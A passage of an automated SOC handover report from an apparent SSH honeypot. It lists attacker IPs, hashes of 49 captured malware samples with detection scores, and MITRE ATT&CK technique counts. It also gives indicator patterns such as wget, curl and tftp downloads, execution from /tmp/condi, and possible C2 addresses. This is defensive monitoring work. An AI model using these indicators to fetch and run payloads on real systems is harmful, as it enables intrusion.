| `3.130.168[.]2` | **2** | 2026-07-02 08:53 | 2026-07-02 08:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.132.26[.]232` | **2** | 2026-07-02 07:32 | 2026-07-02 07:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-07-02 07:26 | 2026-07-02 07:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-02 07:58 | 2026-07-02 07:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.205.123[.]19` | 1 | 2026-07-02 08:24 | 2026-07-02 08:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.139.122[.]80` | 1 | 2026-07-02 08:30 | 2026-07-02 08:30 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-02 08:35 | 2026-07-02 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-02 07:35 | 2026-07-02 07:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.19.12[.]141` | 1 | 2026-07-02 07:59 | 2026-07-02 08:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-07-02 07:32 | 2026-07-02 07:34 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 84/100 | 🔴 HIGH | **35/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **43/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `112.53.123[.]118` | CN | China Mobile Communications Corporation | **100** ⚠️ | 4 |
| `114.29.11[.]190` | KR | HVChungnam | **100** ⚠️ | 20 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `34.156.17[.]76` | BE | Google LLC | **100** ⚠️ | 3 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `94.154.43[.]36` | TR |  | **100** ⚠️ | 21 |
| `3.130.168[.]2` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `58.19.12[.]141` | CN | China Unicom HuBei Province Network | **100** ⚠️ | 2 |
| `3.132.26[.]232` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 61 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 2 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 135 cases |
| Tool 34  | Credential Extractor        | ✅ 82 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 61 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 62 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T10:45:27Z_
